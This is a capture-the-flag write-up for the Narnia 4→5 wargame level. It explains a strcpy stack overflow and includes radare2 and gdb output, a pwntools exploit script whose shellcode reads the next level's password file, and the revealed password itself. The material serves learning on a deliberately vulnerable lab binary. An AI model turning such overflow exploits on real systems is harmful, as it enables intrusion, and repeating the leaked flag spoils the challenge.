## Narnia 4→5

### Writeup

The source code shows us that the binary first clears all environmental variables before simply copying `argv[1]` into a buffer of 256 bytes using `strcpy`. The use of `strcpy` makes the binary vulnerable to stack overflow. We can insert shellcode to `cat /etc/narnia_pass/narnia5` into the buffer, then overwrite the return address of `main` to point to that shellcode and execute it.

Beginning this, we need to know how large our payload needs to be. This can be done by disassembling `main` in radare2.

```text
130: int main (char **argv, char **envp);
  args (sp[0x4..0x8]) vars (sp[0x8..0x108])
  0x08049186  55             push ebp
  0x08049187  89e5           mov ebp, esp
  0x08049189  81ec04010000   sub esp, 0x104
  0x0804918f  c745fc0000...  mov dword [var_4h], 0
  0x08049196  eb38           jmp 0x80491d0
```

In plaintext, these instructions are:

1. Store the base pointer on the stack.
2. Make the base pointer the current stack pointer.
3. Increase stack space by 260 to hold our local variables.

This means the stack looks like this:

```
[return address]
[old base pointer]
[4 bytes for int i]
[256 bytes for buffer]
```

Now we know the payload must be 268 bytes and looks like this: `[NOP sled] [shellcode] [return address]`

A quick check proves us right.

```
Starting program: /narnia/narnia4 $(python3 -c 'print("A" * 264 + "B" * 4)')
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/i386-linux-gnu/libthread_db.so.1".

Temporary breakpoint 1, 0x08049197 in main ()
(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb)
```

All we are missing is knowing the address of our shellcode, which we can solve by causing a segmentation fault and then inspecting the stack in gdb with `x/300x $esp`.

```
(gdb) x/300x $esp
...
0xffffd4e0:  0x3461696e  0x90909090  0x90909090  0x90909090
0xffffd4f0:  0x90909090  0x90909090  0x90909090  0x90909090
0xffffd500:  0x90909090  0x90909090  0x90909090  0x90909090
0xffffd510:  0x90909090  0x90909090  0x90909090  0x90909090
0xffffd520:  0x90909090  0x90909090  0x90909090  0x90909090
0xffffd530:  0x90909090  0x90909090  0x90909090  0x90909090
0xffffd540:  0x90909090  0x90909090  0x90909090  0x90909090
0xffffd550:  0x90909090  0x90909090  0x90909090  0x90909090
0xffffd560:  0x90909090  0x90909090  0x90909090  0x90909090
0xffffd570:  0x90909090  0x90909090  0x90909090  0x90909090
0xffffd580:  0x90909090  0x90909090  0x90909090  0x90909090
0xffffd590:  0x90909090  0x90909090  0x90909090  0x90909090
0xffffd5a0:  0x90909090  0x90909090  0x90909090  0x90909090
0xffffd5b0:  0x90909090  0x90909090  0x90909090  0x90909090
0xffffd5c0:  0x90909090  0x90909090  0x90909090  0x90909090
0xffffd5d0:  0x90909090  0x90909090  0x90909090  0x41414190
0xffffd5e0:  0x00000041  0x00000000  0x00000000  0x00000000
...
```

Highlighted is the end of our payload, so we can pick a low address in the NOP sled to return to. I chose `0xffffd510`, which got me the flag.

```
narnia4@narnia:/tmp/tmp.ZDvkFU584q$ /narnia/narnia4 $(python3 argv_overflow.py)
4VhyE9TRcd
```

<details>
  <summary>Flag</summary>4VhyE9TRcd
</details>

### Script

```python
from pwn import *
import sys

context.arch = 'i386'
context.bits = 32
context.os = 'linux'

total_bytes = 268
address = p32(0xffffd510)

shellcode = asm(shellcraft.execve(
    '/bin/cat',
    ['/bin/cat', '/etc/narnia_pass/narnia5']
))
nop = b"\x90" * (total_bytes - len(shellcode) - len(address))

payload = b"".join([nop, shellcode, address])
sys.stdout.buffer.write(payload)
```